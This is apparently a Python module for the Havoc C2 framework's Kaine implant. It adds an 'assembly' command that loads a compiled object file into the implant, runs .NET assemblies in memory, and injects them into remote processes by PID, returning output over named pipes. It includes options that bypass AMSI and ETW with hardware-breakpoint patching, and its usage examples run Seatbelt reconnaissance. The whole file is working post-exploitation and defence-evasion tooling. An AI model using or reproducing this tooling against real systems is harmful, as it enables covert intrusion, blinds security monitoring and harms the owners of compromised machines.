import argparse
import random
import string
import struct
import asyncio

from os.path       import *
from pyhavoc.agent import *
from typing        import Optional

def util_to_unicode( string ) -> str:
    return string.encode( 'utf-16le' ).decode( 'utf-8' ) + '\x00'


def util_from_unicode( byts ) -> str:
    if isinstance( byts, str ):
        return byts.encode( 'utf-8' ).decode( 'utf-16le' ).rstrip('\x00')
    return byts.decode( 'utf-16le' ).rstrip('\x00')


def file_read( path: str ) -> bytes:
    handle    = open( path, 'rb' )
    obj_bytes = handle.read()

    handle.close()

    return obj_bytes


class AssemblyModule( HcKaineCommand ):

    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )

        self.command          = "assembly"
        self.description      = "assembly execution and injection module"
        self.opsec_safe       = False
        self.key_id     : str = 'obj.assembly'
        self.object_path: str = dirname( __file__ ) + "/bin/assembly." + self.agent().agent_meta()[ 'arch' ] + ".obj"
        
        self.FLAG_PIPE            = 1 << 0  # write output back to a pipe
        self.FLAG_APPDOMAIN       = 1 << 2  # specified a custom app domain
        self.FLAG_LIST_VERSION    = 1 << 3  # list all .NET versions
        self.FLAG_LIST_APPDOMAINS = 1 << 4  # list all app domains in the current process
        self.FLAG_INJECTED        = 1 << 5  # check if the loader has been injected. behaviours are going to change based on this flag like connecting back to the pipe
        self.FLAG_LOAD            = 1 << 6  # do not unload assembly after finishing executing
        self.FLAG_INVOKE          = 1 << 7  # invoke already loaded assembly file
        self.FLAG_BYPASS_ETW      = 1 << 8  # patch etw using hardware breakpoints
        self.FLAG_BYPASS_AMSI     = 1 << 9  # patch amsi using hardware breakpoints
        self.FLAG_UNLOAD          = 1 << 10 # unload specified domain

        return

    def arguments(
        self
    ):
        self.parser.epilog = (
            "example usage:\n"
            "  assembly execute --file /opt/Seatbelt.exe --arguments=\"-group=all -full\"\n"
            "  assembly inject 1337 --file /opt/Seatbelt.exe --arguments=\"-group=all -full\"\n"
            "  assembly --list-versions\n"
            "  assembly --list\n"
        )

        # create the top-level parser
        self.parser.add_argument( '--install', action='store_true', help="install the assembly extension to the kaine implant" )
        self.parser.add_argument( '--uninstall', action='store_true', help="uninstall the assembly extension from the kaine implant" )
        self.parser.add_argument( '--list', action='store_true', help="list loaded app domains and assemblies" )
        self.parser.add_argument( '--unload', default='', type=str, help="unload specified app domain and it's loaded assemblies" )
        self.parser.add_argument( '--list-versions', action='store_true', help="list available and installed CLR versions" )
        self.parser.add_argument( '--version', default='', type=str, help="use specific CLR version to list app domains and assemblies (default: get the first installed runtime version)" )

        # create sub-parser
        sub_parsers = self.parser.add_subparsers( help='assembly commands', dest="command" )

        # create the parser for the "execute" sub-command
        parser_execute = sub_parsers.add_parser( 'execute', help='inline/in-process execution of assembly files' )
        parser_execute.add_argument( '--file', type=str, help='assembly file to execute' )
        parser_execute.add_argument( '--arguments', default='', type=str, help="argument's to pass to the assembly file" )
        parser_execute.add_argument( '--appdomain', default='', type=str, help='app domain to use (default app domain is going to get used if not specified)' )
        parser_execute.add_argument( '--random-appdomain', action='store_true', help='generate a random name for the app domain' )
        parser_execute.add_argument( '--bypass-amsi', action='store_true', help='use hardware breakpoints to patch amsi' )
        parser_execute.add_argument( '--bypass-etw', action='store_true', help='use hardware breakpoints to patch etw' )
        parser_execute.add_argument( '--bypass-all', action='store_true', help='use hardware breakpoints to patch etw & amsi' )
        parser_execute.add_argument( '--version', default='', type=str, help="use specific CLR version to execute assembly (default: get the first installed runtime version)" )
        parser_execute.add_argument( '--keep-loaded', action='store_true', help="should the assembly and domain specified be kept in memory after execution (by default it is going to be released and freed)" )
        parser_execute.add_argument( '--invoke', default='', type=str, help="invoke already loaded assembly" )

        # create the parser for the "inject" sub-command
        parser_inject = sub_parsers.add_parser( 'inject', help='remote process assembly injection command' )
        parser_inject.add_argument( 'pid', type=int, help='process id to inject assembly to' )
        parser_inject.add_argument( '--file', type=str, help='assembly file to inject and execute' )
        parser_inject.add_argument( '--arguments', default='', type=str, help="argument's to pass to the assembly file" )
        parser_inject.add_argument( '--appdomain', default='', type=str, help='app domain to use (default app domain is going to get used if not specified)' )
        parser_inject.add_argument( '--random-appdomain', action='store_true', help='generate a random name for the app domain' )
        parser_inject.add_argument( '--bypass-amsi', action='store_true', help='use hardware breakpoints to patch amsi' )
        parser_inject.add_argument( '--bypass-etw', action='store_true', help='use hardware breakpoints to patch etw' )
        parser_inject.add_argument( '--bypass-all', action='store_true', help='use hardware breakpoints to patch etw & amsi' )
        parser_inject.add_argument( '--version', default='', type=str, help="use specific CLR version to execute assembly (default: get the first installed runtime version)" )
        parser_inject.add_argument( '--pipe', default='', type=str, help="named pipe to use for pipe back the output (default: random name gets generated)" )

        return

    async def object_install( self ): 
        """
            tries to install the assembly module to the kaine agent 
        """
        kaine = self.agent()

        if self.key_id in kaine.key_store:
            ##
            ## if the key already exists in the key_store then 
            ## it means the object assembly file has been already
            ## installed 
            ##
            handle = hex( kaine.key_store[ self.key_id ] )
            self.log_warning( f"assembly injection & execution module already installed [handle: { handle }]" )
            return

        ##
        ## check if the bof file exists 
        ##
        if exists( self.object_path ) is False:
            self.log_error( f"object file not found: { self.object_path }" )
            return
        
        ##
        ## read object file bytes 
        ##
        obj_bytes = file_read( self.object_path )
        if len( obj_bytes ) == 0: 
            self.log_error( f"object file is emtpy: { self.object_path }" )
            return 

        ##
        ## task the agent to load the object file as a module (cached)
        ##
        module    = kaine.object_module( obj_bytes )
        task_uuid = format( await module.task_uuid(), 'x' ) 

        self.log_info( f"({task_uuid}) install assembly execution and injection module" )

        ##
        ## wait til the object file has been loaded and get the status  
        ##
        status = await module.status()
        if status != "STATUS_SUCCESS":
            self.log_error( f"failed while registering assembly module: { await module.error() }" )
            return
        
        self.log_good( f"({task_uuid}) successfully installed assembly module" )

        ##
        ## save the loaded object handle into the key store
        ##
        kaine.key_store[ self.key_id ] = await module.handle()

        return 

    async def object_uninstall( self ): 
        """
            tries to uninstall the assembly module from the kaine agent. 
        """
        kaine = self.agent()

        if self.key_id not in kaine.key_store:
            ##
            ## if the key does not exist in the key_store then the module
            ## either has not been installed or already uninstalled 
            ##
            self.log_warning( "assembly injection & execution module has not been installed!" )
            return
        
        handle = kaine.key_store[ self.key_id ]

        ##
        ## task the agent to load the object file as a module (cached)
        ##
        module    = kaine.object_module( handle )
        task_uuid = format( await module.task_uuid(), 'x' ) 

        self.log_info( f"({task_uuid}) uninstall assembly execution and injection module" )

        ##
        ## task the agent to free up the memory   
        ##
        status = await module.free()
        if status != "STATUS_SUCCESS":
            self.log_error( f"failed while uninstalling assembly module: { await module.error() }" )
            return
        
        self.log_good( f"({task_uuid}) successfully uninstalled assembly module" )

        ##
        ## delete key and it's handle
        ##
        del kaine.key_store[ self.key_id ]

        return

    async def execute( self, args ):

        if args.install:
            await self.object_install()

        elif args.uninstall:
            await self.object_uninstall()

        elif args.list:
            task = await self.assembly_list( args.version )
            uuid = format( task.task_uuid(), 'x' )

            self.log_info( f"({uuid}) list loaded app domains and assemblies" )

            try: 
                hresult, appdomains = await task.result() 

                if hresult == 0: 
                    if len( appdomains ) > 0:
                        self.log_info( 'listing app domains and loaded assemblies:' )
                        self.log_raw( '' )
                        for domain in appdomains:
                            self.log_raw( f'   [{domain}]:' )
                            for assembly in appdomains[ domain ]: 
                                self.log_raw( f'      - {assembly}' )
                        self.log_raw( '' )
                    else:
                        self.log_warning( 'no app domains or assemblies loaded' )
                else: 
                    self.log_warning( f'failed to invoke assembly module: {hresult:x}' )                
            except Exception as e: 
                self.log_error( f"({uuid}) failed to execute command: {e}" )
                return
            
            self.log_good( f"({uuid}) successfully executed command" )

        elif args.list_versions:
            task = await self.assembly_list_version()
            uuid = format( task.task_uuid(), 'x' )

            self.log_info( f"({uuid}) list installed runtimes versions" )

            try: 
                hresult, runtimes = await task.result() 

                if hresult == 0: 
                    if len( runtimes ) > 0:
                        self.log_info( "list installed runtimes:" )
                        for ver in runtimes: 
                            self.log_info( f' - {ver}' )
                    else:
                        self.log_warning( f'no runtimes installed' )      
                else: 
                    self.log_error( f'failed to invoke assembly module: {hresult:x}' )
            except Exception as e: 
                self.log_error( f"({uuid}) failed to execute command: {e}" )
                return
            
            self.log_good( f"({uuid}) successfully executed command" )

        elif len( args.unload ) > 0:
            task = await self.assembly_unload( args.unload, args.version )
            uuid = format( task.task_uuid(), 'x' )

            self.log_info( f"({uuid}) unloading app domain: {args.unload}" )

            try: 
                hresult = await task.result() 

                if hresult == 0: 
                    self.log_good( f'unloaded app domain: {args.unload}' )
                else: 
                    self.log_error( f"failed while unloading app domain: {args.unload} [HRESULT: {hresult:x}]" )
            except Exception as e: 
                self.log_error( f"({uuid}) failed to execute command: {e}" )
                return       

            self.log_good( f"({uuid}) successfully executed command" )

        elif args.command == "inject":
            assembly   : bytes = b''
            app_domain : str   = args.appdomain

            # since we are register a callback we have to only allow inject
            if self.key_id not in self.agent().key_store:
                self.log_error( 'assembly module needs to be installed to use "assembly inject"' )
                return 
            
            if exists( args.file ) is False:
                self.log_error( f"assembly file not found: { args.file }" )
                return
            else: 
                assembly = file_read( args.file )

            if len( app_domain ) > 0:
                self.log_info( f"custom app domain is going to be used: { app_domain }" )
            else:
                if args.random_appdomain is False:
                    self.log_warning( "default app domain is going to be used" )

            if args.random_appdomain:
                # check if an app domain name has been specified cuz if we did we're just
                # going to use this instead and ignore the --random-appdomain flag
                if len( app_domain ) > 0:
                    self.log_warning( "random app domain generation flag ignored as a name has been specified" )
                else:
                    app_domain = ''.join(random.choice(string.ascii_lowercase) for i in range(6))
                    self.log_info( f"random app domain is going to be used: { app_domain }" )

            if len( args.version ) > 0:
                self.log_info( f"using runtime version {args.version} for assembly execution" )
            else:
                self.log_warning( "no runtime version specified (first installed runtime version is going to be used)" )

            bypass_amsi = args.bypass_all or args.bypass_amsi if True else False
            bypass_etw  = args.bypass_all or args.bypass_etw  if True else False

            # log the that a bypass has been enabled
            if bypass_etw or bypass_amsi:
                if bypass_etw and bypass_amsi:
                    self.log_info( "enable hardware breakpoint hooking bypass for etw & amsi" )
                elif bypass_etw:
                    self.log_info( "enable hardware breakpoint hooking bypass for etw " )
                elif bypass_amsi:
                    self.log_info( "enable hardware breakpoint hooking bypass for amsi" )

            ##
            ## issue assembly injection task 
            ##

            task = await self.assembly_inject( 
                process_id  = args.pid,
                assembly    = assembly,
                arguments   = args.arguments,
                app_domain  = app_domain,
                version     = args.version,
                named_pipe  = args.pipe, 
                bypass_amsi = bypass_amsi,
                bypass_etw  = bypass_etw,
                callback    = lambda agent, data, **kwargs: self.assembly_callback(
                    basename( args.file ),
                    agent,
                    data,
                    **kwargs
                )
            )

            uuid = format( task.task_uuid(), 'x' )

            self.log_info( f"({uuid}) inject .NET assembly file into {args.pid}: {args.file}" )

            try: 
                await task.result()
            except Exception as e: 
                self.log_error( f"({uuid}) failed to execute command: {e}" )
                return
            
            self.log_good( f"({uuid}) successfully injected assembly" )
            return

        elif args.command == "execute":

            assembly = args.invoke

            if len( assembly ) == 0:
                if exists( args.file ) is False:
                    self.log_error( f"assembly file not found: { args.file }" )
                    return
                else: 
                    assembly = file_read( args.file )
                
            app_domain = args.appdomain

            if len( app_domain ) > 0:
                self.log_info( f"custom app domain is going to be used: { app_domain }" )
            else:
                if args.random_appdomain is False:
                    self.log_warning( "default app domain is going to be used" )

            if args.random_appdomain:
                # check if an app domain name has been specified cuz if we did we're just
                # going to use this instead and ignore the --random-appdomain flag
                if len( app_domain ) > 0:
                    self.log_warning( "random app domain generation flag ignored as a name has been specified" )
                else:
                    app_domain = ''.join(random.choice(string.ascii_lowercase) for i in range(6))
                    self.log_info( f"random app domain is going to be used: { app_domain }" )

            if len( args.version ) > 0:
                self.log_info( f"using runtime version {args.version} for assembly execution" )
            else:
                self.log_warning( "no runtime version specified (first installed runtime version is going to be used)" )

            bypass_amsi = args.bypass_all or args.bypass_amsi if True else False
            bypass_etw  = args.bypass_all or args.bypass_etw  if True else False

            # log the that a bypass has been enabled
            if bypass_etw or bypass_amsi:
                if bypass_etw and bypass_amsi:
                    self.log_info( "enable hardware breakpoint hooking bypass for etw & amsi" )
                elif bypass_etw:
                    self.log_info( "enable hardware breakpoint hooking bypass for etw " )
                elif bypass_amsi:
                    self.log_info( "enable hardware breakpoint hooking bypass for amsi" )

            ##
            ## task object module to execute assembly file  
            ##

            task = await self.assembly_execute( 
                assembly    = assembly,
                arguments   = args.arguments,
                app_domain  = app_domain,
                version     = args.version,
                keep_loaded = args.keep_loaded,
                bypass_amsi = bypass_amsi,
                bypass_etw  = bypass_etw
            )

            uuid = format( task.task_uuid(), 'x' )

            if len( args.invoke ) > 0:
                self.log_info( f"({uuid}) execute already loaded .NET assembly: {args.invoke}" )
            else:
                self.log_info( f"({uuid}) execute .NET assembly file: {args.file} ({ len( assembly ) } bytes)" )

            try: 
                hresult, output = await task.result();

                if hresult == 0:
                    if len( output ) > 0: 
                        self.log_good( f"output of executed assembly [{ len( output ) } bytes]:" )
                        self.log_raw( f"\n{ output }" )
                    else: 
                        self.log_warning( "no output received from executed assembly" )
                else:
                    self.log_error( f"failed to invoke dotnet stub: {hresult:x} { self.error_reason(hresult) }" )
            except Exception as e:
                self.log_error( f"({uuid}) failed to execute command: {e}" )
                return

            self.log_good( f"({uuid}) successfully executed command" )

        return

    async def assembly_list( 
        self, 
        version: Optional[str] = None
    ) -> HcKaineTask:
        """
        list all app domains in the current loaded CLR

        :version:
            CLR version to use

        :return:
            return a HcKaineTask  

            HRESULT:
                hresult status of listing appdomain 

            AppDomainList: dict[str, list]
                list of app domains loaded into the current CLR instance
        """

        kaine     : HcKaine = self.agent()
        net_ver   : bytes   = b''
        obj_entry : str     = 'AssemblyMisc'

        if len( version ) > 0: 
            net_ver = util_to_unicode( version )

        ##
        ## we are going to create a task 
        ## 
        object_task = HcKaineTask( kaine )
        object_task.set_coroutine( self._assembly_response( 'list', self._assembly_object(
            object_task.task_uuid(),
            obj_entry,
            *(self.FLAG_LIST_APPDOMAINS, net_ver)
        ) ) )

        return object_task

    async def assembly_list_version(
        self,
    ) -> HcKaineTask: 
        """
            list installed CLR versions 

            :return:
                return a HcKaineTask  

                HRESULT:
                    hresult status of listing runtime versions

                Versions: list[str]
                    list of runtime versions 
        """

        kaine     : HcKaine = self.agent()
        obj_entry : str     = 'AssemblyMisc'

        ##
        ## we are going to create a task 
        ## 
        object_task = HcKaineTask( kaine )
        object_task.set_coroutine( self._assembly_response( 'list-version', self._assembly_object(
            object_task.task_uuid(),
            obj_entry,
            self.FLAG_LIST_VERSION
        ) ) )

        return object_task

    async def assembly_execute(
        self,
        assembly    : str | bytes,
        arguments   : str         = '',
        app_domain  : str         = '',
        version     : str         = '',
        keep_loaded : bool        = False,
        bypass_amsi : bool        = False,
        bypass_etw  : bool        = False,
    ) -> HcKaineTask: 
        """
            executes an assembly in the current process

            :param assembly:
                either execute already loaded assembly (str)
                or load and execute assembly (bytes)

            :param arguments: 
                arguments to be passed to the assembly file
            
            :param app_domain:
                app domain to create and use for the assembly file.
                if none specified default app domain of CLR instance
                is going to be used. if an pre-existing assembly is 
                invoked then this value is going to be ignored

            :param version: 
                CLR version to use to execute assembly. if no version 
                has been specified then is going ot use the first 
                installed version

            :param bypass_amsi:
                bypass amsi using hardware breakpoints

            :param bypass_etw:
                bypass etw using hardware breakpoints
            
            :return:
                return a HcKaineTask

                HRESULT: 
                    hresult status of executing the assembly file

                Output: 
                    output of executed assembly file 
        """

        kaine        : HcKaine = self.agent()
        obj_entry    : str     = 'AssemblyInvoke'
        net_args     : bytes   = b''
        net_domain   : bytes   = b''
        net_flag     : int     = 0
        net_assembly : bytes   = b''
        net_version  : bytes   = b''

        ##
        ## sanity check given assembly file bytes 
        ##

        if type( assembly ) == bytes:
            if len( assembly ) == 0:
                raise RuntimeError( 'assembly parameter is empty' )

            is_x64, is_Net = True, True # self._sanity_check_assembly( assembly=assembly )

            if is_Net is False: 
                raise RuntimeError( 'specified executable is not an .NET assembly file' )
            
            if is_x64 is False and kaine.agent_meta()[ 'arch' ] == 'x64':
                raise RuntimeError( "specified .NET executable is not x64" )

            elif is_x64 is True and kaine.agent_meta()[ 'arch' ] == 'x86':
                raise RuntimeError( "specified .NET executable is not x86" )
            
            net_assembly = assembly
        else: 
            net_flag     |= self.FLAG_INVOKE 
            net_assembly  = util_to_unicode( assembly )

        ##
        ## convert given parameters to object
        ## file arguments and apply flags  
        ##

        if len( version ) > 0:
            net_version = util_to_unicode( version )

        if len( app_domain ) > 0:
            net_flag  |= self.FLAG_APPDOMAIN
            net_domain  = util_to_unicode( app_domain )

        if len( arguments ) > 0:
            net_args = util_to_unicode( arguments )

        if bypass_etw:
            net_flag |= self.FLAG_BYPASS_ETW

        if bypass_amsi:
            net_flag |= self.FLAG_BYPASS_AMSI

        if keep_loaded:
            net_flag |= self.FLAG_LOAD

        net_flag |= self.FLAG_PIPE

        ##
        ## we are going to create a task 
        ## 

        object_task = HcKaineTask( kaine )
        object_task.set_coroutine( self._assembly_response( 'execute', self._assembly_object(
            object_task.task_uuid(),
            obj_entry,
            *(net_flag, net_assembly, net_args, net_domain, net_version),
        ) ) )

        return object_task
    
    async def assembly_inject(
        self,
        process_id  : int, 
        assembly    : bytes,
        arguments   : str    = '',
        app_domain  : str    = '',
        version     : str    = '',
        named_pipe  : str    = '',
        bypass_amsi : bool   = False,
        bypass_etw  : bool   = False, 
        callback    : object = None
    ) -> HcKaineTask:
        """
            inject assembly file into a remote process 
            and pipe back the output over a named pipe

            :param assembly: 
                assembly file bytes to inject and execute 

            :param arguments:
                arguments to pass to the assembly file

            :param app_domain:
                app domain to create and use for the assembly file.
                if none specified default app domain of CLR instance
                is going to be used

            :param version:
                CLR version to use to execute assembly. if no version 
                has been specified then is going ot use the first 
                installed version

            :param bypass_amsi:
                bypass amsi using hardware breakpoints

            :param bypass_etw:
                bypass etw using hardware breakpoints

            :return:
                return a HcKaineTask
        """ 

        obj_entry    : str     = 'AssemblyInject'
        net_flag     : int     = 0
        net_args     : bytes   = b''
        net_domain   : bytes   = b''
        net_assembly : bytes   = b''
        net_version  : bytes   = b''
        net_pipe     : bytes   = b''

        ##
        ## prepare and sanity check arguments 
        ##

        if len( assembly ) == 0:
            raise RuntimeError( 'assembly parameter is empty' )

        is_x64, is_Net = True, True # self._sanity_check_assembly( assembly=assembly )

        if is_Net is False: 
            raise RuntimeError( 'specified executable is not an .NET assembly file' )
        
        if is_x64 is False and self.agent().agent_meta()[ 'arch' ] == 'x64':
            raise RuntimeError( "specified .NET executable is not x64" )

        elif is_x64 is True and self.agent().agent_meta()[ 'arch' ] == 'x86':
            raise RuntimeError( "specified .NET executable is not x86" )
        
        net_assembly = assembly

        ##
        ## convert given parameters to object
        ## file arguments and apply flags  
        ##

        if len( version ) > 0:
            net_version = util_to_unicode( version )

        if len( app_domain ) > 0:
            net_flag   |= self.FLAG_APPDOMAIN
            net_domain  = util_to_unicode( app_domain )

        if len( arguments ) > 0:
            net_args = util_to_unicode( arguments )

        if len( named_pipe ) > 0:
            net_pipe = named_pipe.encode()
        else:
            net_pipe = ''.join( random.choice( string.ascii_lowercase ) for i in range( 6 ) ).encode()

        net_pipe = b'\\\\.\\pipe\\' + net_pipe
        net_pipe = util_to_unicode( net_pipe.decode() )

        if bypass_etw:
            net_flag |= self.FLAG_BYPASS_ETW

        if bypass_amsi:
            net_flag |= self.FLAG_BYPASS_AMSI

        net_flag |= self.FLAG_PIPE
        net_flag |= self.FLAG_INJECTED

        ##
        ## we are going to create a task 
        ## 

        object_task = HcKaineTask( self.agent() )
        object_task.set_coroutine( self._assembly_response( 'inject', self._assembly_object(
            object_task.task_uuid(),
            obj_entry,
            *(process_id, net_flag, net_assembly, net_args, net_domain, net_version, net_pipe),
            callback = callback
        ) ) )

        return object_task
    
    async def assembly_unload(
        self,
        app_domain: str,
        version   : str = ''
    ) -> HcKaineTask: 
        
        net_version: bytes = b''
        net_domain : bytes = b''
        obj_entry  : str   = 'AssemblyMisc'

        ##
        ## prepare arguments to be passed 
        ##

        if len( version ) > 0:
            net_version = util_to_unicode( version )

        net_domain = util_to_unicode( app_domain )

        ##
        ## we are going to create a task 
        ## 

        object_task = HcKaineTask( self.agent() )
        object_task.set_coroutine( self._assembly_response( 'unload', self._assembly_object(
            object_task.task_uuid(),
            obj_entry,
            *(self.FLAG_UNLOAD, net_version, net_domain),
        ) ) )

        return object_task

    def _sanity_check_assembly(
        self,
        assembly: bytes
    ) -> tuple[bool, bool]:
        import pefile

        is_x64: bool = False
        is_Net: bool = False

        try:
            pe = pefile.PE(data=assembly, fast_load=True)

            if pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR']].VirtualAddress != 0:
                is_Net = True

            if pe.FILE_HEADER.Machine == pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_AMD64']:
                is_x64 = True
        except pefile.PEFormatError as err:
            self.agent().console_log( type="error", text=f"invalid PE file: {err}" )

        return is_x64, is_Net

    async def _assembly_response(
        self,
        command: str,
        future : asyncio.Future 
    ): 
        """
            this is a wrapper that takes the response of the 
        """
        context = await future

        if command == 'list': 
            status, data, error = context
            hresult             = 0
            app_domains_list    = {}
            parser              = KnParser( data )
            
            if status != 'STATUS_SUCCESS':
                raise RuntimeError( f'failed to execute assembly module: {error}' )
            
            if parser.length() > 0:
                hresult = parser.parse_int()

                while parser.length() > 0:
                    app_domain    = util_from_unicode( parser.parse_bytes() )
                    assembly_list = []

                    if len( app_domain ) < 0:
                        break

                    while parser.length() > 0:
                        assembly = util_from_unicode( parser.parse_bytes() )
                        if len( assembly ) == 0:
                            break
                            
                        assembly_list.append( assembly )
                    
                    app_domains_list[ app_domain ] = assembly_list

            return hresult, app_domains_list
        
        elif command == 'list-version': 
            status, data, error = context
            hresult : int       = 0
            runtimes: list[str] = []
            parser  : KnParser  = KnParser( data )
            
            if status != 'STATUS_SUCCESS':
                raise RuntimeError( f'failed to execute assembly module: {error}' )
            
            if parser.length() > 0:
                hresult = parser.parse_int()

                while parser.length() > 0:
                    version = util_from_unicode( parser.parse_bytes() )
                    if len( version ) < 0:
                        break

                    runtimes.append( version )
                
            return hresult, runtimes

        elif command == 'execute':
            status, data, error = context
            hresult: int        = 0
            output : bytes      = []
            parser : KnParser   = KnParser( data )
            
            if status != 'STATUS_SUCCESS':
                raise RuntimeError( f'failed to execute assembly module: {error}' )
            
            if parser.length() > 0:
                hresult = parser.parse_int()
                output  = parser.buffer.decode( 'utf-8' )
                
            return hresult, output
        
        elif command == 'unload':
            status, data, error = context
            hresult: int        = 0
            parser : KnParser   = KnParser( data )
            
            if status != 'STATUS_SUCCESS':
                raise RuntimeError( f'failed to execute assembly module: {error}' )
            
            if parser.length() > 0:
                hresult = parser.parse_int()
                
            return hresult
        
        elif command == 'inject': 
            return 
        
        return

    async def _assembly_object(
        self,
        task_uuid : int,
        obj_entry : str,
        *obj_args,
        callback  : object = None
    ) -> tuple[str, bytes, str]: 
        """
            interacts with the object file if already 
            loaded and if not then load it and execute it

            :args 
                arguments to pass to the 
                assembly object file  
        """
        ##
        ## make HcKaine.command( name ) -> HcKaineCommand
        ##
        kaine = self.agent()    
        error = ''

        ##
        ## execute object file with specified arguments 
        ##

        if self.key_id in kaine.key_store:
            ##
            ## invoke the already loaded object file in memory 
            ##  
            obj_handle   = kaine.key_store[ self.key_id ]
            status, data = await kaine.object_module( obj_handle, task_uuid=task_uuid ).invoke( obj_entry, *obj_args, callback=callback )
            
            if status != 'STATUS_SUCCESS':
                error = data

            return status, data, error
        else:
            ##
            ## the object file has not been loaded yet 
            ## so prepare it and install it (if configured)
            ##
            packer: KnPacker = KnPacker()
            buffer: bytes    = b''

            ##
            ## check if object file exists
            ##
            if exists( self.object_path ) is False:
                self.log_error( f"object file not found: {self.object_path}" )
                return

            ##
            ## read object file from disk
            ##
            obj_bytes = file_read( self.object_path )
            
            ##
            ## create parameter buffer 
            ##
            if len( obj_args ) > 0:
                for i in obj_args:
                    if type( i ) == int:
                        packer.add_u32( i )
                    elif type( i ) == str:
                        packer.add_string( i )
                    elif type( i ) == bytes:
                        packer.add_bytes( i )

                buffer = packer.build()

            ##
            ## invoke object file
            ##
            status, result = await kaine.object_execute( 
                object_type = obj_bytes, 
                entry       = obj_entry, 
                parameters  = buffer, 
                callback    = callback,
                pass_return = True
            ).result()

            if status != 'STATUS_SUCCESS':
                error = result

            return status, result, error
        
        return '', b'', ''

    @staticmethod
    def assembly_callback(
        ctx           : string,
        agent         : HcKaine,
        data          : bytes,
        task_uuid     : int,
        callback_uuid : string
    ):
        parser = KnParser( data )
        status = parser.parse_int()

        STATUS_PIPE_DISCONNECTED = 0xC00000B0
        STATUS_PIPE_BROKEN       = 0xC000014B
        
        if len( data ) > 0:
            parser = KnParser( data )
            status = parser.parse_int()

            if status == 0 and parser.length() > 0:
                if parser.length() == 4:
                    status = struct.unpack('<I', parser.buffer)[0]
                    agent.console_log( type="error", text=f"failed to invoke dotnet stub: {status:x} { AssemblyModule.error_reason( status ) }" )
                else:
                    agent.console_log( type="success", text=f"output of executed assembly [{ parser.length() } bytes]:" )
                    agent.console_log( type="raw", text=f"\n{ parser.buffer.decode( 'utf-8' ) }" )
            else:
                ##
                ## STATUS_PIPE_DISCONNECTED or STATUS_PIPE_BROKEN
                ##
                ## which basically means that the execution of the
                ## assembly has finished.
                ##
                if status == STATUS_PIPE_DISCONNECTED or status == STATUS_PIPE_BROKEN:
                    agent.console_log( type="success", text=f"({task_uuid:x}) finished executing {ctx}" )
                else:
                    agent.console_log( type="error", text=f"({task_uuid:x}) failed to invoke dotnet stub: {status:x} { AssemblyModule.error_reason( status ) }" )

                ##
                ## unregister callback
                ##
                HcAgentUnRegisterCallback( callback_uuid )

                return
        return

    @staticmethod
    def error_reason(
        status: int
    ) -> str:
        reason = ''

        if status == 0xc0000225:
            reason = '(specified app domain or assembly not found)'
        if status == 0x8007000b:
            reason = '(either invalid file or security product blocked it)'

        return reason
    

